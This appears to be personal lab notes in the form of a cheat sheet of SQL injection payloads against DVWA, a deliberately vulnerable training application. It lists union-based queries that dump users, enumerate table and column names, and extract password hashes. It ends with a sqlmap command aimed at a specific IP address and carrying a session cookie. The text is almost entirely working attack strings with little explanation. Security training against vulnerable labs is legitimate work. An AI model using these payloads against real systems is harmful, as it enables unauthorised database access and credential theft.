# SQL Injection 

##### Dump all users 
```sql
%' or '0'='0
```

##### Manual enumeration 

###### Trying to guess column names 
```sql
%' or '0'='0' union select COLUMN_NAME from information_schema.COLUMNS #
```

###### Find the table and column names 
```sql
%' or '0'='0' union select TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS #
```

##### Dumping password hashes 
```sql
%' or '0'='0' union select user, password from dvwa.users #
```

### Automated 
---

### Using sqlmap 
```sh
# Find backend DB
python ./sqlmap.py -u "http://161.35.202.77/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=d4ool8gsr78mnro6cas6mrlf35; security=low" --dbs

```
